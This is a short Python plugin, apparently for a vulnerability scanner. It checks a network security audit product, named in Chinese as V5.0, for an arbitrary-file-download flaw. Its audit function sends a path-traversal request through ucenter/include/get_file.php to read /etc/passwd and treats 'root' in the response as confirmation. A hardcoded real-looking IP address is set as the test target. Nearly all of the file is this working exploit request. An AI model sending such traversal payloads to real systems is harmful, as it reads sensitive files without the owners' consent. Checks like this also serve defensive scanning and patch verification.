#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Author:judger
#Sertype:中科新业网络安全审计系统V5.0任意文件下载
def assign(service, arg):
	if service == "seentech_uccenter":
		return True, arg

def audit(arg):
	payload = 'ucenter/include/get_file.php?view=../../../../../../../etc/passwd'
	url = arg + payload
	code, head, body, errcode, _url = curl.curl2(url)
	if code == 200 and 'root' in body:
		security_hole('Arbitrary file download:'+url)

if __name__ == '__main__':
	from dummy import *
	audit(assign('seentech_uccenter', 'https://219.134.131.244/')[1])